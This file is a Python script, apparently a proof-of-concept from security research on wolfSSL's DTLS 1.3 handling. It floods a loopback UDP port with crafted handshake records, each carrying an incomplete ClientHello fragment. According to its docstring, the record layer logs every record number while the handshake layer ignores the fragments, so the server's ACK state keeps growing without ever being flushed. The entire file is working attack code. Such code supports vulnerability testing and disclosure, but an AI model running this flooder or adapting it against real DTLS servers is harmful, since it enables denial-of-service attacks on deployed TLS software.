#!/usr/bin/env python3
"""Loopback-only DTLS 1.3 ACK-fill sender: incomplete ClientHello fragments.

Each datagram is a *valid legacy DTLS 1.3 handshake record* (type 22, epoch 0)
carrying an incomplete ClientHello fragment: message_seq=0, fragment_offset=0,
fragment_length=4 < message_length=1024. The record layer adds its record
number to seenRecords (Dtls13RecordRecvd), but the handshake layer ignores the
incomplete plaintext fragment (Dtls13AcceptFragmented returns 0 without
WOLFSSL_DTLS_CH_FRAG), so no ServerHello/epoch switch and no ACK flush occurs.

All addresses are 127.0.0.1; one connected UDP socket, one peer.

Usage: loopback_frag_sender.py PORT COUNT [epoch] [msglen] [pace_us] [unified] [seq_base_hex]
"""
import socket
import sys
import time

CH_TYPE = 1          # handshake client_hello
FRAG_LEN = 4         # deliberately < msglen: never a complete CH
BODY = bytes([0x03, 0x03, 0x00, 0x00])[:FRAG_LEN]


def record(seq, epoch, msglen, unified=False):
    hs = bytearray(12)
    hs[0] = CH_TYPE
    hs[1:4] = msglen.to_bytes(3, "big")
    hs[4:6] = (0).to_bytes(2, "big")       # message_seq
    hs[6:9] = (0).to_bytes(3, "big")       # fragment_offset
    hs[9:12] = FRAG_LEN.to_bytes(3, "big")
    payload = bytes(hs) + BODY
    if unified:
        # DTLS 1.3 unified header: fixed bits 0x20, epoch bits, 16-bit seq,
        # length present. Epoch 0 => flags 0x2c.
        flags = 0x20 | (epoch & 3) | 0x08 | 0x04
        return bytes([flags]) + (seq & 0xffff).to_bytes(2, "big") + \
            len(payload).to_bytes(2, "big") + payload
    rec = bytearray(13)
    rec[0] = 22                            # handshake
    rec[1:3] = b"\xfe\xfd"                 # legacy DTLS wire version
    rec[3:5] = epoch.to_bytes(2, "big")
    rec[5:11] = seq.to_bytes(6, "big")
    rec[11:13] = len(payload).to_bytes(2, "big")
    return bytes(rec) + payload


def main():
    if len(sys.argv) < 3:
        raise SystemExit(__doc__)
    port = int(sys.argv[1])
    count = int(sys.argv[2])
    epoch = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    msglen = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
    pace_us = int(sys.argv[5]) if len(sys.argv) > 5 else 0
    unified = len(sys.argv) > 6 and sys.argv[6] == "unified"
    seq_base = int(sys.argv[7], 16) if len(sys.argv) > 7 else 0
    if msglen <= FRAG_LEN:
        raise SystemExit("msglen must exceed fragment length")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("127.0.0.1", 0))
    s.connect(("127.0.0.1", port))
    print("FACT frag_sender src=%s total=%d msglen=%d" %
          (str(s.getsockname()), count, msglen), flush=True)

    t0 = time.time()
    for i in range(count):
        seq = (seq_base + i) & 0xffffffffffff
        s.send(record(seq, epoch, msglen, unified))
        if pace_us:
            time.sleep(pace_us / 1000000.0)
        if seq and seq % 1000 == 0:
            print("FACT frag_sent=%d elapsed=%.3f" % (seq, time.time() - t0),
                  flush=True)
    print("FACT frag_sent_total=%d elapsed=%.3f" % (count, time.time() - t0),
          flush=True)
    s.close()


if __name__ == "__main__":
    main()
